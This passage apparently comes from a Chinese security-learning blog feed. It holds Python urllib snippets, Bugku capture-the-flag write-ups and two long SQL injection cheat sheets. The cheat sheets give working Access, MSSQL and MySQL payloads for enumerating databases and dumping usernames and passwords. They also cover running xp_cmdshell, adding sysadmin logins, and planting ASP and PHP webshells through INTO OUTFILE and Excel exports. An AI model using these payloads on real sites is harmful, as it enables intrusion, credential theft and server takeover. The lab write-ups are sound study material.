urlopen(req)</span><br><span class="line"><span class="keyword">except</span> URLError <span class="keyword">as</span> e:</span><br><span class="line">  <span class="keyword">if</span> hasattr(e, <span class="string">'reason'</span>):</span><br><span class="line">    print(<span class="string">'We failed to reach a server.'</span>)</span><br><span class="line">    print(<span class="string">'Reason: '</span>, e.reason)</span><br><span class="line">  <span class="keyword">elif</span> hasattr(e, <span class="string">'code'</span>):</span><br><span class="line">    print(<span class="string">'The server couldn\'t fulfill the request.'</span>)</span><br><span class="line">    print(<span class="string">'Error code: '</span>, e.code)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  print(<span class="string">"good!"</span>)</span><br><span class="line">  print(response.read().decode(<span class="string">"utf8"</span>))</span><br></pre></td></tr></table></figure><h2 id="HTTP认证"><a href="#HTTP认证" class="headerlink" title="HTTP认证"></a>HTTP认证</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line">  </span><br><span class="line">import urllib.request</span><br><span class="line">  </span><br><span class="line"><span class="comment"># create a password manager</span></span><br><span class="line">password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()</span><br><span class="line">  </span><br><span class="line"><span class="comment"># Add the username and password.</span></span><br><span class="line"><span class="comment"># If we knew the realm, we could use it instead of None.</span></span><br><span class="line">top_level_url = <span class="string">"https://cms.tetx.com/"</span></span><br><span class="line">password_mgr.add_password(None, top_level_url, 'yzhang', 'cccddd')</span><br><span class="line">  </span><br><span class="line">handler = urllib.request.HTTPBasicAuthHandler(password_mgr)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># create "opener" (OpenerDirector instance)</span></span><br><span class="line">opener = urllib.request.build_opener(handler)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># use the opener to fetch a URL</span></span><br><span class="line">a_url = <span class="string">"https://cms.tetx.com/"</span></span><br><span class="line">x = opener.open(a_url)</span><br><span class="line">print(x.read())</span><br><span class="line">  </span><br><span class="line"><span class="comment"># Install the opener.</span></span><br><span class="line"><span class="comment"># Now all calls to urllib.request.urlopen use our opener.</span></span><br><span class="line">urllib.request.install_opener(opener)</span><br><span class="line">  </span><br><span class="line">a = urllib.request.urlopen(a_url).read().decode('utf8')</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><hr><h2 id="使用代理"><a href="#使用代理" class="headerlink" title="使用代理"></a>使用代理</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python3</span><br><span class="line">  </span><br><span class="line">import urllib.request</span><br><span class="line">  </span><br><span class="line">proxy_support = urllib<span class="selector-class">.request</span><span class="selector-class">.ProxyHandler</span>(&#123;<span class="string">'sock5'</span>: <span class="string">'localhost:1080'</span>&#125;)</span><br><span class="line">opener = urllib<span class="selector-class">.request</span><span class="selector-class">.build_opener</span>(proxy_support)</span><br><span class="line">urllib<span class="selector-class">.request</span><span class="selector-class">.install_opener</span>(opener)</span><br><span class="line"> </span><br><span class="line">  </span><br><span class="line"><span class="selector-tag">a</span> = urllib<span class="selector-class">.request</span><span class="selector-class">.urlopen</span>(<span class="string">"http://g.cn"</span>).read().decode(<span class="string">"utf8"</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(a)</span></span></span><br></pre></td></tr></table></figure><hr><h2 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line">  </span><br><span class="line">import <span class="built_in">socket</span></span><br><span class="line">import urllib.request</span><br><span class="line">  </span><br><span class="line"><span class="comment"># timeout in seconds</span></span><br><span class="line">timeout = <span class="number">2</span></span><br><span class="line"><span class="built_in">socket</span>.setdefaulttimeout(timeout)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># this call to urllib.request.urlopen now uses the default timeout</span></span><br><span class="line"><span class="comment"># we have set in the socket module</span></span><br><span class="line">req = urllib.request.Request(<span class="string">'http://twitter.com/'</span>)</span><br><span class="line"><span class="keyword">a</span> = urllib.request.urlopen(req).<span class="built_in">read</span>()</span><br><span class="line">print(<span class="keyword">a</span>)</span><br></pre></td></tr></table></figure><hr>]]></content>
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 抓取页面内容 </tag>
            
            <tag> 脚本 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WP_Bugku_变量1</title>
      <link href="/2018/08/08/Writeup/WP-Bugku-%E5%8F%98%E9%87%8F1/"/>
      <url>/2018/08/08/Writeup/WP-Bugku-%E5%8F%98%E9%87%8F1/</url>
      <content type="html"><![CDATA[<p>参考文章：<a href="https://blog.csdn.net/anjiaowangmenghan/article/details/76460872" target="_blank" rel="noopener">https://blog.csdn.net/anjiaowangmenghan/article/details/76460872</a></p><p>题目地址：<a href="http://120.24.86.145:8004/index1.php" target="_blank" rel="noopener">http://120.24.86.145:8004/index1.php</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable ! <span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"flag1.php"</span>;</span></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__file__</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'args'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $args = $_GET[<span class="string">'args'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,$args))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="string">");</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>注意最后的<code>eval(&quot;var_dump($$args);</code>参数args前有两个$$<br>参考下面：<br><img src="https://i.imgur.com/0S8C6B3.png" alt=""><br>所以只需要传一个全局变量就好<br>构url：<br><a href="http://120.24.86.145:8004/index1.php?args=GLOBALS" target="_blank" rel="noopener">http://120.24.86.145:8004/index1.php?args=GLOBALS</a><br>得到flag{92853051ab894a64f7865cf3c2128b34}</p>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WP-Bugku-sql注入2</title>
      <link href="/2018/08/08/Writeup/WP-Bugku-sql%E6%B3%A8%E5%85%A52/"/>
      <url>/2018/08/08/Writeup/WP-Bugku-sql%E6%B3%A8%E5%85%A52/</url>
      <content type="html"><![CDATA[<p>题目地址：<a href="http://120.24.86.145:8007/web2/" target="_blank" rel="noopener">http://120.24.86.145:8007/web2/</a></p><p>这道题是DS_Store源码泄露<a href="https://www.secpulse.com/archives/55286.html" target="_blank" rel="noopener"><font color="red">常见Web源码泄露总结</font></a><br><a href="https://github.com/lijiejie/ds_store_exp.git" target="_blank" rel="noopener">ds_store_exp下载</a><br>用DS_Store_exp扫描改网址：<br><img src="https://i.imgur.com/BjhNv3y.png" alt=""><br>进入<br><a href="http://120.24.86.145:8007/web2/flag" target="_blank" rel="noopener">http://120.24.86.145:8007/web2/flag</a><br>下载得到flag{sql_iNJEct_comMon3600!}</p>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Bugku </tag>
            
            <tag> DS_Store源码泄露 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PHP函数漏洞</title>
      <link href="/2018/08/08/PHP%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2018/08/08/PHP%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<p>偶然看见网上总结比较全面的PHP函数漏洞，先码住<br>传送门：<a href="https://blog.csdn.net/qq_35078631/article/details/75200157" target="_blank" rel="noopener">https://blog.csdn.net/qq_35078631/article/details/75200157</a></p>]]></content>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WP-Bugku-flag在index里</title>
      <link href="/2018/08/08/Writeup/WP-Bugku-flag%E5%9C%A8index%E9%87%8C/"/>
      <url>/2018/08/08/Writeup/WP-Bugku-flag%E5%9C%A8index%E9%87%8C/</url>
      <content type="html"><![CDATA[<p>题目地址： <a href="http://120.24.86.145:8005/post/" target="_blank" rel="noopener">http://120.24.86.145:8005/post/</a></p><p>进入题目后看到只有一个可点击的文字<br>点击之后跳转到<a href="http://120.24.86.145:8005/post/index.php?file=show.php" target="_blank" rel="noopener">http://120.24.86.145:8005/post/index.php?file=show.php</a></p><p>想到题目是：flag在index里<br>那么可能是文件包含<br>构造url：<br><a href="http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</a><br>得到了一串base64加密的字符串<br>base64解密得到包含flag的代码<br>得到flag{edulcni_elif_lacol_si_siht}</p><hr>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Bugku </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqlmap常规使用</title>
      <link href="/2018/08/08/sqlmap%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2018/08/08/sqlmap%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/</url>
      <content type="html"><![CDATA[<p><img src="https://i.imgur.com/AnahV1c.png" alt=""></p><p><img src="https://i.imgur.com/QG7BnkZ.png" alt=""></p>]]></content>
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> Web </tag>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SQL手工注入常用语句</title>
      <link href="/2018/08/07/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5/"/>
      <url>/2018/08/07/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5/</url>
      <content type="html"><![CDATA[<p>文章来源：暗组</p><p>判断数据库类型:<br>Access:<br>and (select id from MSysAccessObjects) &gt;0 返回正常说明是access</p><p>MSSQL:<br>and (select id from sysobjects) &gt;0 返回正常说明是mssql</p><p>MySQL:<br>and length(user())&gt;0    返回正常说明是MySQL</p><p>mysql：</p><p>1.判断版本 and ord(mid(version(),1,1))&gt;51 /<em> 返回正常说明是4.0以上版本，可以用union查询<br>2.利用order by 暴字段，在网址后加 order by 10 /</em> 如果返回正常说明字段大于10<br>3.再利用union来查询准确字段，如: order by 或者and 1=2 union select 1,2,3,……./<em>直到返回正常，说明猜到准确字段数。如过滤了空格可以用/**/代替。<br>4.判断数据库连接帐号有没有写权限，and (select count(</em>) from mysql.user)&gt;0 /<em>如果结果返回错误，那我们只能猜解管理员帐号和密码了。<br>5.如果返回正常，则可以通过and 1=2 union select 1,2,3,4,5,6,load_file(char(文件路径的ascii值，用逗号隔开)),8,9,10 /</em> 注：load_file(char(文件路径的ascii值，用逗号隔开))也可以用十六进制，通过这种方式读取配置文件，找到数据库连接等。</p><p>6、检测是不是root权限 and/*<em>/ord(mid(user(),1,1))=114/</em></p><p>7、mysql内置函数hex()转换字符为16进制，如select hex(user())<br>mysql内置函数unhex() 解码16进制，如select unhex(hex(user())) </p><p>8、mysql内置函数concat()将多列合并成一列，如select concat(username,0x3A,password) from t_member</p><p>9、常用内置函数使用：<br>select system_user()  查看系统用户</p><p>select current_user()  查询当前用户</p><p>select user()  查询用户</p><p>SELECT version()  查询数据库版本</p><p>SELECT database()  查询当前连接的数据库</p><p>select @@version_compile_os 查询当前操作系统</p><p>select @@datadir    查询读取数据库路径<br>select @@basedir    查询MYSQL安装路径</p><p>———————-淫荡的分割线———————————————</p><p>去掉limit 1,1为查询出所有行，第一个数字代表查询第几个，第二个数字代表一次查询出的数量<br>第一个数字从1开始递增，查询到3时浏览器返回错误，说明存在2个库/表。</p><p>10、查数据库数量<br>union select cuncat(schema_name,0x3A)  from information_schema.schemata limit 1,1</p><p>11、查询表<br>union select table_name from information_schema.tables where table_schema =库名 limit 1,1</p><p>MSSQL：</p><p>检测是否为SA权限<br>and 1=(select IS_SRVROLEMEMBER(‘sysadmin’));–</p><p>检测是否为DB权限<br>and 1=(Select IS_MEMBER(‘db_owner’))</p><p>爆所有数据库 union select name from master.dbo.sysdatabases where dbid=1  1代表第一个库</p><p>爆所有表<br>第一张表 union select  top 1 name from 库名.dbo.sysobjects where xtype=’U’</p><p>第二张表 union select  top 1 name from 库名.dbo.sysobjects where xtype=’U’ and name not in(‘第一张表’)</p><p>第三张表 union select  top 1 name from 库名.dbo.sysobjects where xtype=’U’ and name not in(‘第一张表’,’第二张表’)<br>…</p><p>爆列：<br>爆ID  select id from seay.dbo.sysobjects where xtype=’U’ and name=’admin’</p><p>爆第一个列 select top 1 name from seay.dbo.syscolumns where id=ID号</p><p>爆第二个列  select top 1 name from seay.dbo.syscolumns where id=ID号 and name not in(‘第一个列’)<br>…</p><p>爆数据：<br>select 列名 from 表名</p><p>exec master.dbo.xp_dirtree ‘c:\’;  遍历目录<br>exec master.dbo.xp_availablemedia;– 获得当前所有驱动器<br>exec master.dbo.xp_subdirs ‘c:\’;– 获得子目录列表<br>exec master.dbo.xp_dirtree ‘c:\’;– 获得所有子目录的目录树结构<br>exec master.dbo.xp_cmdshell ‘type c:\web\web.config’;– 查看文件的内容 </p><p>备份数据库：backup database 库名 to disk=’c:/l.asp’; </p><p>MSSQL内置函数：<br>select @@version  查询数据库版本</p><p>select user_name() 查询当前数据库连接用户名</p><p>select db_name()  查询当前数据库名</p><p>更改sa密码<br>exec sp_password NULL,’新密码’,’sa’</p><p>添加SA权限用户<br>exec sp_addlogin ‘username’,’pass’,’master’;<br>exec sp_addsrvrolemember ‘username’, sysadmin</p><p>检测是否支持多行<br>;declare @d int;–</p><p>停掉或激活某个服务。</p><p>exec master..xp_servicecontrol ‘stop’,’schedule’<br>exec master..xp_servicecontrol ‘start’,’schedule’</p><p>解开压缩档。</p><p>xp_unpackcab ‘c:\test.cab’,’c:\temp’,1</p><p>恢复 xp_cmdshell<br>;exec master..dbo.sp_addextendedproc ‘xp_cmdshell’,’xplog70.dll’;–</p><p>开启沙盘模式：<br>exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Jet\4.0\Engines’,’SandBoxMode’,’REG_DWORD’,1</p><hr>]]></content>
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> SQL </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WP-Bugku-成绩单</title>
      <link href="/2018/08/05/Writeup/WP-Bugku-%E6%88%90%E7%BB%A9%E5%8D%95/"/>
      <url>/2018/08/05/Writeup/WP-Bugku-%E6%88%90%E7%BB%A9%E5%8D%95/</url>
      <content type="html"><![CDATA[<p>题目地址：<a href="http://120.24.86.145:8002/chengjidan/" target="_blank" rel="noopener">http://120.24.86.145:8002/chengjidan/</a></p><p>进入这道题目 我们先手遍历一遍<br><code>id=-1&#39; union select 1,2,3,4#</code></p><p>发现有四个表且都有回显</p><p>于是 就开始爆破吧</p><p>通过<br><code>id=-1&#39; union select 1,2,3,database()#</code><br>得到数据库名字skctf_flag</p><p>之后通过<br><code>id=-1&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#</code><br>得到表名fl4g,sc</p><ul><li><a href="#1"><font color="darkred">关于mysql中group_concat(),information_schema</font></a></li></ul><p>很显然我们需要的数据在fl4g这个表里</p><p>接下来我们就要爆字段了</p><p>通过<br><code>id=-1&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c3467#//这里需要用16进制绕过</code><br>得到字段skctf_flag</p><ul><li><a href="#2"><font color="darkblue">关于用16进制绕过(引号绕过)</font></a>以及<a href="https://blog.csdn.net/qq_35078631/article/details/74931777" target="_blank" rel="noopener"><font color="darkred">详细资料</font></a></li></ul><p>最后我们就可以开始查询数据了</p><p>通过<br><code>id=-1&#39; union select 1,2,3,skctf_flag from fl4g#</code><br>得到BUGKU{Sql_INJECT0N_4813drd8hz4}</p><hr><div id="1"><br>mysql中的information_schema 结构用来存储数据库系统信息<br><br>information_schema 结构中这几个表存储的信息，在注射中可以用到的几个表。　<br><br>| SCHEMATA ――&gt;存储数据库名的，<br><br>|——&gt;关键字段：SCHEMA_NAME，表示数据库名称<br><br>| TABLES ――&gt;存储表名的<br><br>|——&gt;关键字段：TABLE_SCHEMA表示表所属的数据库名称；<br><br>TABLE_NAME表示表的名称<br><br>| COLUMNS ――&gt;存储字段名的<br><br>|——&gt;关键字段：TABLE_SCHEMA表示表所属的数据库名称；<br><br>TABLE_NAME表示所属的表的名称<br><br>　　　　COLUMN_NAME表示字段名<br><br>可以看到，我们只要通过注射点构造查询语句遍相关字段，就可以得到我们想要的信息了。<br><br>爆所有数据名<br><br>select group_concat(SCHEMA_NAME) from information_schema.schemata<br><br>得到当前库的所有表<br><br>select group_concat(table_name) from information_schema.tables where table_schema=database()<br><br>得到表中的字段名 将敏感的表进行16进制编码adminuser=0x61646D696E75736572<br><br>select group_concat(column_name) from information_schema.columns where table_name=0x61646D696E75736572<br><br>得到字段具体的值<br>select group_concat(username,0x3a,password) from adminuser<br></div><hr><div id="2"><img src="https://i.imgur.com/0iK9fkN.png" alt=""></div><hr>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Bugku </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>常规SQL注入笔记</title>
      <link href="/2018/07/25/%E5%B8%B8%E8%A7%84SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/07/25/%E5%B8%B8%E8%A7%84SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>转载自<a href="http://599985375.lofter.com/post/1d071723_7b32422" target="_blank" rel="noopener">http://599985375.lofter.com/post/1d071723_7b32422</a></p><h1 id="基本常识"><a href="#基本常识" class="headerlink" title="基本常识"></a>基本常识</h1><p><strong>简单判定有无漏洞</strong>：</p><ul><li><p>粗略型：提交单引号’</p></li><li><p>逻辑型（数字型注入）：and 1=1/and 1=2</p></li><li><p>逻辑型（字符型注入）：’ and ‘1’=’1/‘ and ‘1’=’2</p></li><li><p>逻辑型（搜索型注入）：%’ and 1=1 and ‘%’=’%/%’ and 1=2 and ‘%’=’%</p></li></ul><p><strong>简单判断数据库信息</strong>：<br>粗略型：</p><ul><li>加单引号’（根据服务器报错的信息来判断）</li><li>加;–（;表示分离，– 则是注释符，;和–MSSQL数据库有，ACCESS数据库没有）</li></ul><p>逻辑型：</p><ul><li>and user&gt;0</li><li>and (select count(*) from msysobjects)&gt;0 ……（页面错误为access数据库）</li><li>and (select count(*) from sysobjects)&gt;0 ……（页面正常为MSSQL数据库）</li><li>and db_name()&gt;0 ……（爆数据库名）</li><li>and version&gt;0（爆SQLServer版本信息以及服务器操作系统的类型和版本信息）</li></ul><p><strong>判断MYSQL权限</strong>：</p><ul><li>and 0&lt;&gt;（Select ISSRVROLEMEMBER（’sysadmin’））–（页面正常则为SA）</li><li>and 0&lt;&gt;（Select IS_MEMBER（’db_owner’））–（页面正常则为db_owner）</li><li>and 0&lt;&gt;（Select IS_MEMBER（’public’））–（页面正常则是public）<font color="red"><br>注意：<br>以上方法适用于参数是int数字型的时候。若为字符型，需在参数后添加单引号’并在查询语句后添加;–，搜索型注入以此类推。<br></font></li></ul><h1 id="ACCESS注入基本流程："><a href="#ACCESS注入基本流程：" class="headerlink" title="ACCESS注入基本流程："></a>ACCESS注入基本流程：</h1><p><strong>猜解表名</strong>：</p><ul><li>and 0&lt;&gt;(select count(<em>) from 表名) 或 and exists（Select </em> from 表名）<br><strong>猜解字段</strong>：</li><li>and exists（Select 字段名 from 表名）（页面正常存在该字段，不正常不存在该字段）<br><strong>猜解用户名和密码长度</strong>：</li><li>and（Select top 1 len（列名） from 表名）&gt;N<br>（TOP表示把最前面的一条记录提取出来；N为变换猜解的列长度，页面错误即说明该列长度为N）<br>如：</li><li>and 1=(select count(*) from user where len(name)&gt;6) 错误</li><li>and 1=(select count(*) from user where len(name)&gt;5) 正确<br>则表示user表中name字段的第一条记录的长度是6。</li></ul><p><strong>猜解用户名和密码</strong>：</p><ul><li>and (select top 1 asc(mid(列名,1,1)) from 表名)&gt;0<br>如：</li><li>and (select top 1 asc(mid(name,1,1)) from user)&gt;96 页面正常</li><li>and (select top 1 asc(mid(name,1,1)) from user)&gt;97 页面错误<br>则表示user表中name字段的第一条记录的第一个字符的ASCLL码为97<font color="red"><br>注意：<br>因为MD5的密文长度通常有16位、18位、32位、40位等几种，<br>所以猜解密码的时候试一试15、16、17、18、31、32、39、40等长度可以加快猜解进度。<br></font></li></ul><h1 id="MSSQL报错注入基本流程："><a href="#MSSQL报错注入基本流程：" class="headerlink" title="MSSQL报错注入基本流程："></a>MSSQL报错注入基本流程：</h1><p>爆出表名和字段：having 1=1–</p><p>猜解表名：</p><p>获得第一个表名：<br>and (select top 1 name from sysobjects where xtype=’u’)&gt;0</p><p>获得第二个表名：<br>and (select top 1 name from sysobjects where xtype=’u’ and name not in (‘user’))&gt;0</p><p>以此类推。</p><p>猜解列名：</p><p>得到col_name表中的第一个列名：<br>and (select top 1 col_name(object_id(‘字段’),1) from sysobjects)&gt;0</p><p>猜解字段内容：<br>and (select top 1 列名 from [表名])&gt;0</p><p>如：</p><p>获取用户名：<br>and (select top 1 username from [admin])&gt;0</p><p>获取密码：<br>and (select top 1 password from [admin])&gt;0</p><p>导出webshell：</p><p>方法1：利用SQL执行命令功能导出WebShell</p><p>SELECT ‘&lt;%execute request(“a”)%&gt;’ into [vote] in ‘d:webx.asp;.xls’ ‘excel 8.0;’ from vote</p><p>注意：需拥有SQL执行权限且知道绝对路径</p><p>方法2：</p><p>建立一个有一个A字段的表 表名为a，字段类型为字符，长度为50。</p><p>在表A的a字段插入一句话木马，把表a的内容导出为物理路径的一个EXCEL文件。</p><p>导出为EXCEL后在利用IIS解析漏洞就可以变成webshell了。</p><p>方法2的SQL语句：</p><p>create table cmd (a varchar(50))</p><p>insert into cmd (a) values (‘&lt;%execute request(“listentide”)%&gt;’)</p><p>select * into [a] in ‘f:hostqhdyxtweba.asp;.xls’ ‘excel 4.0;’ from cmd</p><p>drop table cmd</p><h1 id="MYSQL注入基本流程："><a href="#MYSQL注入基本流程：" class="headerlink" title="MYSQL注入基本流程："></a>MYSQL注入基本流程：</h1><p>MYSQL注入漏洞是否存在的判断方法与ACCESS注入和MSSQL注入相同。</p><p>MYSQL注入漏洞的数据库类型判断方法也可以使用单引号’。</p><p>数据库权限判断：<br>and ord(mid(user(),1,1))=114 /* （页面正常说明为root）</p><p>判断当前页面字段总数：</p><p>方法1、用union联合查询：and 1=1 union select 1,2,3,4,5……</p><p>方法2、用order by 查询“order by *–</p><p>判断显示位：</p><p>方法1、<a href="http://www.f4ck.org/article.php?id=1" target="_blank" rel="noopener">http://www.f4ck.org/article.php?id=1</a> and 1=2 union select 1,2,3,4,5,6,7……</p><p>方法2、<a href="http://www.f4ck.org/article.php?id=-1" target="_blank" rel="noopener">http://www.f4ck.org/article.php?id=-1</a> union select 1,2,3,4,5,6,7……</p><p>查库：</p><p>版本大于5.0的mysql的information_schema库中存储着mysql的所有数据库和表结构信息，所以可以利用information_schema库快速注入。</p><p>获取第一个库名：<br>and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1</p><p>获取第二个库名：<br>and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 1,2</p><p>以此类推。</p><p>查表：</p><p>获取数据库中第一个表名：<br>and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库名的十六进制 limit 0,1</p><p>获取数据库中第二个表名：<br>and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库名的十六进制 limit 1,2</p><p>查列：</p><p>获取数据库中指定表的第一个列名：<br>and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名的十六进制 limit 0,1</p><p>获取数据库中指定表的第二个列名：<br>and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名的十六进制 limit 0,1</p><p>得到字段内容：</p><p>在不同的显示位显示不同的字段内容：<br>and 1=2 Union select 1,2,3,用户名段,5,6,7,密码段,8,9 from 表名 limit 0,1</p><p>在同一个显示位显示不同的字段内容：<br>and 1=2 Union select 1,2,3concat(用户名段,0x3c,密码段),5,6,7,8,9 from 表名 limit 0,1</p><p>一次性查出所有表名：<br>union select 1,2,3,4,GROUP_CONCAT(DISTINCT table_name),6 from information_schema.columns where table_schema=数据库名的16进制</p><p>一次性查出所有字段名：<br>union select 1,2,3,4,GROUP_CONCAT(DISTINCT column_name),6 from information_schema.columns where table_schema=数据库名的16进制</p><p>导出一句话WebShell：</p><p>方法1：</p><p>Drop TABLE IF EXISTS temp;</p><p>Create TABLE temp(cmd text NOT NULL);</p><p>Insert INTO temp (cmd) VALUES(‘’);</p><p>Select cmd from temp into out file ‘F:/wwwroot/eval.php’;</p><p>Drop TABLE IF EXISTS temp;</p><p>方法2：</p><p>Select ‘’ into outfile ‘F:/wwwroot/eval.php’;</p><p>load_file() 常用路径：</p><p>c:/windows/system32/inetsrv/MetaBase.xml 查看IIS的虚拟主机配置文件</p><p>/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件</p><p>c:/Program Files/Apache Group/Apache/conf/httpd.conf 或C:/apache/conf/httpd.conf 查看WINDOWS系统apache的配置文件</p><p>c:/Resin-3.0.14/conf/resin.conf查看jsp开发的网站 resin文件配置信息</p><hr>]]></content>
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> SQL </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Web常见漏洞及分析</title>
      <link href="/2018/07/22/Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%88%86%E6%9E%90/"/>
      <url>/2018/07/22/Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%88%86%E6%9E%90/</url>
